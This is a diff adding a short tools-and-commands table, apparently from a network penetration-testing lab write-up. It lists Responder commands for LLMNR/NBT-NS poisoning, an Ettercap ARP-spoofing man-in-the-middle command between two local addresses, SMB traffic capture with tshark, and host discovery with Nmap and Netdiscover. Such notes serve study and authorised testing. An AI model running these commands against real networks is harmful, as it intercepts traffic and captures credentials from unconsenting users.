@@ -1,1 +1,19 @@
+##Tools Used
+Tool		   Purpose	                              Platform
+Responder	 LLMNR/NBT-NS poisoner & SMB relay	    Kali Linux
+Ettercap	 ARP spoofing & MitM attacks	          Kali Linux
+Wireshark	 Network protocol analysis	            Kali Linux
+Nmap		   Network discovery & scanning	          Kali Linux
+
+
+##Commands Used
+Tool        Command	                                                         Purpose
+Responder  	sudo responder -I eth0 -wrf	                                     Start Responder with all modules
+Responder	  sudo responder -I eth0 -dwv	                                     Poison LLMNR/NBT-NS/DNS
+Ettercap	  sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.200//	 ARP spoofing attack
+Ettercap	  sudo ettercap -Tq -i eth0                                     	 Start Ettercap in text mode
+Wireshark 	sudo wireshark &                                               	 Launch GUI interface
+Wireshark	  tshark -i eth0 -f "port 445" -w smb.pcap	                       Capture SMB traffic
+Nmap	      nmap -sn 192.168.1.0/24	                                         Discover live hosts
+Netdiscover	sudo netdiscover -i eth0 -r 192.168.1.0/24                     	 ARP network discovery
 
